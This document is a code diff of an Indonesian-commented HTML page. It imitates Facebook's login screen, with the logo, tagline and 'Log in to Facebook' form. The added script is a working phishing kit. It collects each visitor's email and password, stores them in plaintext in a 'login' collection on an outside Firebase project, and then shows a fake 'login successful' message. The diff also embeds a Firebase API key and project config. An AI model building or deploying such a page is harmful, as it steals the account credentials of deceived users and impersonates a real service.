@@ -1,16 +1,15 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login Facebook Style</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Login</title>
 
-  <!-- SweetAlert -->
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<!-- SweetAlert -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-  <style>
-    /* CSS dari saya tadi taruh di sini */
-    body {
+<style>
+body {
   margin: 0;
   font-family: Arial, sans-serif;
   background: #f0f2f5;
@@ -25,15 +24,15 @@
 /* KIRI */
 .left {
   flex: 1;
-  padding: 100px;
   display: flex;
   flex-direction: column;
   justify-content: center;
+  padding-left: 80px;
 }
 
 .logo {
   color: #1877f2;
-  font-size: 50px;
+  font-size: 60px;
   font-weight: bold;
 }
 
@@ -55,7 +54,7 @@
 }
 
 .login-box {
-  width: 350px;
+  width: 380px;
   background: white;
   padding: 25px;
   border-radius: 10px;
@@ -64,105 +63,162 @@
 }
 
 .login-box h3 {
-  margin-bottom: 15px;
+  margin-bottom: 20px;
 }
 
-/* Input */
+/* INPUT */
 input {
   width: 100%;
-  padding: 12px;
-  margin: 8px 0;
-  border: 1px solid #ddd;
+  padding: 14px;
+  margin-bottom: 12px;
+  border: 1px solid #dddfe2;
   border-radius: 6px;
+  font-size: 16px;
 }
 
-/* Tombol login */
-#loginBtn {
+/* BUTTON LOGIN */
+button {
   width: 100%;
-  padding: 12px;
+  padding: 14px;
   background: #1877f2;
   color: white;
   border: none;
   border-radius: 6px;
-  font-size: 16px;
+  font-size: 18px;
+  font-weight: bold;
   cursor: pointer;
 }
 
-#loginBtn:hover {
+button:hover {
   background: #166fe5;
 }
 
-/* Lupa password */
+/* LINK */
 .forgot {
+  display: block;
+  margin: 15px 0;
   color: #1877f2;
+  text-decoration: none;
   font-size: 14px;
-  cursor: pointer;
 }
 
-/* Garis */
-hr {
+/* GARIS */
+.divider {
+  border-top: 1px solid #ddd;
   margin: 15px 0;
 }
 
-/* Tombol daftar */
-.create {
-  width: 100%;
-  padding: 12px;
-  background: white;
-  color: #1877f2;
-  border: 1px solid #1877f2;
-  border-radius: 25px;
-  cursor: pointer;
+/* BUTTON BUAT AKUN */
+.create-btn {
+  background: #42b72a;
+  font-size: 16px;
 }
 
-.create:hover {
-  background: #f0f2f5;
+.create-btn:hover {
+  background: #36a420;
 }
 
-/* Meta */
-.meta {
-  margin-top: 10px;
-  font-size: 12px;
-  color: gray;
+/* RESPONSIVE */
+@media (max-width: 768px) {
+  .main {
+    flex-direction: column;
+  }
+
+  .left {
+    text-align: center;
+    padding: 20px;
+  }
+
+  .logo {
+    font-size: 40px;
+  }
+
+  .tagline {
+    font-size: 20px;
+  }
 }
-  </style>
+</style>
 </head>
 
 <body>
 
-  <!-- ISI BODY (kode yang tadi) -->
-  <div class="main">
-    
-    <div class="left">
-      <div class="logo">facebook</div>
-      <p class="tagline">Explore the things <span>you love.</span></p>
-    </div>
+<div class="main">
 
-    <div class="right">
-      <div class="login-box">
-        <h3>Log in to Facebook</h3>
-        
-        <input type="text" id="email" placeholder="Email address or mobile number">
-        <input type="password" id="password" placeholder="Password">
-
-        <button id="loginBtn">Log in</button>
-
-        <p class="forgot">Forgotten password?</p>
-
-        <hr>
-
-        <button class="create">Create new account</button>
-
-        <p class="meta">Meta</p>
-      </div>
-    </div>
-
+  <!-- KIRI -->
+  <div class="left">
+    <div class="logo">facebook</div>
+    <div class="tagline">Explore the things <span>you love.</span></div>
   </div>
 
-  <!-- SCRIPT FIREBASE (tetap sama, jangan diubah) -->
-  <script type="module">
-    // kode firebase + sweetalert kamu
-  </script>
+  <!-- KANAN -->
+  <div class="right">
+    <div class="login-box">
+      <h3>Log in to Facebook</h3>
+
+      <input type="text" id="email" placeholder="Email address or mobile number">
+      <input type="password" id="password" placeholder="Password">
+
+      <button id="loginBtn">Log in</button>
+
+      <a href="#" class="forgot">Forgotten password?</a>
+
+      <div class="divider"></div>
+
+      <button class="create-btn">Create new account</button>
+    </div>
+  </div>
+
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDfs59hRYtUtFG3dVMZ3aGTIm3FvvbDnx8",
+  authDomain: "test-bf56f.firebaseapp.com",
+  projectId: "test-bf56f",
+  storageBucket: "test-bf56f.firebasestorage.app",
+  messagingSenderId: "276624363412",
+  appId: "1:276624363412:web:b232a9df7bf64e4edac981"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// tombol login
+document.getElementById("loginBtn").addEventListener("click", async () => {
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+
+  if (email === "" || password === "") {
+    Swal.fire("Isi dulu email & password!");
+    return;
+  }
+
+  try {
+    await addDoc(collection(db, "login"), {
+      email: email,
+      password: password,
+      waktu: new Date()
+    });
+
+    Swal.fire({
+      icon: "success",
+      title: "Login Berhasil",
+      text: "Selamat datang!"
+    });
+
+  } catch (e) {
+    console.error(e);
+    Swal.fire({
+      icon: "error",
+      title: "Error",
+      text: e.message
+    });
+  }
+});
+</script>
 
 </body>
 </html>
